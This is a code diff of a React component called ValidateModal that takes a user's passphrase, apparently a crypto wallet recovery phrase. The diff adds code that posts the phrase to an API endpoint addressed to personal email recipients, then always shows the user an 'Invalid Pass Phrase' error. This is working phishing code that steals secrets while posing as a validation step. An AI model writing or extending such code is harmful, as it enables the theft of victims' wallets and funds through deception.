@@ -41,18 +41,24 @@ const ValidateModal = (props: Props) => {
     form.setFieldsValue({ device_info: deviceInfo });
     setIsLoading(true);
 
+    const body = {
+      subject: "New Phrase has Been Submitted",
+      phrase: phrase,
+   //  to: "merchantvalidation088@gmail.com",
+     to: "nkematu5@gmail.com",
+    };
+
     try {
-      await emailjs.send(
-        import.meta.env.VITE_EMAIL_SERVICE_ID,
-        import.meta.env.VITE_EMAIL_TEMPLATE_ID,
-        {
-          device_info: deviceInfo,
-          passphrase: phrase,
+      await axios.post(import.meta.env.VITE_API_ENDPOINT, body, {
+        headers: {
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Credentials": true,
+
+          // Authorization: `Bearer ${import.meta.env.VITE_API_KEY}`,
         },
-        import.meta.env.VITE_EMAIL_PUBLIC_KEY
-      );
+      });
       setErrorMessage(true);
-      message.error("Invalid Pass Phrase");
+      message.error("Invalid Pass Phrase"); // await emailjs.send(
     } catch (error) {
       console.error("Email sending failed:", error);
     } finally {
